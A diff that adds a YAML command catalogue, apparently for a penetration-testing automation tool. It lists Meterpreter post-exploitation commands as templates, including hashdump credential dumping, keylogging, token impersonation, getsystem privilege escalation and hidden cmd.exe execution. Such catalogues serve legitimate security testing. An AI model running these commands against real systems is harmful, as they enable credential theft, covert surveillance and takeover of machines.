@@ -1,0 +1,179 @@
+---
+name: Meterpreter
+description: Metasploit's network-extensible payload with in-memory DLL injection stagers
+os: Linux
+ptf_module: modules/exploitation/metasploit
+---
+commands:
+  - "List Available Commands":
+    - type: ["meterpreter","interactive"]
+    - text: "help"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display System Info":
+    - type: ["meterpreter","interactive"]
+    - text: "sysinfo"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Processes":
+    - type: ["meterpreter","interactive"]
+    - text: "ps"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Current PID":
+    - type: ["meterpreter","interactive"]
+    - text: "getpid"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Upload File":
+    - type: ["meterpreter","interactive"]
+    - text: "upload {FILE} {FULLPATH}"
+    - input: ["source file","destination file path (escaped backslashes)"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Download File":
+    - type: ["meterpreter","interactive"]
+    - text: "download {FULLPATH}"
+    - input: ["target file path (escaped backslashes)"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"},{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Interact with Registry":
+    - type: ["meterpreter","interactive"]
+    - text: "reg {STR}"
+    - input: ["registry command"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Revert to Original User":
+    - type: ["meterpreter","interactive"]
+    - text: "rev2self"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Drop to Interactive Shell (Windows target)":
+    - type: ["meterpreter","interactive"]
+    - text: "shell"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"cmd"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Migrate to Another Process (by PID)":
+    - type: ["meterpreter","interactive"]
+    - text: "migrate {INT}"
+    - input: ["target process PID"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Background Current Session":
+    - type: ["meterpreter","interactive"]
+    - text: "background"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Use the Keylogger":
+    - type: ["meterpreter","interactive"]
+    - text: "keyscan_{STRMENU}"
+    - input: [{"keyscan action":["start","stop","dump"]}]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Execute cmd.exe and Interact":
+    - type: ["meterpreter","interactive"]
+    - text: "execute -f cmd.exe -i"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"cmd"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Execute cmd.exe as Hidden Process with All Tokens":
+    - type: ["meterpreter","interactive"]
+    - text: "execute -f cmd.exe -i -H -t"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"cmd"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Dump Local Hashes":
+    - type: ["meterpreter","interactive"]
+    - text: "hashdump"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Run Meterpreter Script (from /scripts/meterpreter/)":
+    - type: ["meterpreter","interactive"]
+    - text: "run {STR}"
+    - input: ["script name"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Port Forward Through Meterpreter Session":
+    - type: ["meterpreter","interactive"]
+    - text: "portfwd add -L 127.0.0.1 -l {INT} -r {IPV4} -p {INT}"
+    - input: ["listening port","remote IPv4 address","target remote TCP port number"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Privilege Escalation (use priv)":
+    - type: ["meterpreter","interactive"]
+    - text: "use priv"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Privilege Escalation (getsystem)":
+    - type: ["meterpreter","interactive"]
+    - text: "getsystem"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Impersonate Token":
+    - type: ["meterpreter","interactive"]
+    - text:
+      - "use incognito"
+      - "list_tokens -u"
+      - "impersonate_token {STR}\\\\{STR}"
+    - input: ["target domain","target user"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Stop Token Impersonation":
+    - type: ["meterpreter","interactive"]
+    - text: "drop_token"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Gather Recently Accessed Files and Web Links":
+    - type: ["meterpreter","interactive"]
+    - text: "run post/windows/gather/dumplinks"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Spawn New Process and Tree C:\\":
+    - type: ["meterpreter","interactive"]
+    - text: "execute -H -f cmd.exe -a '/c tree /F /A c:\\"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Exit Meterpreter":
+    - type: ["meterpreter","interactive"]
+    - text: "exit"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
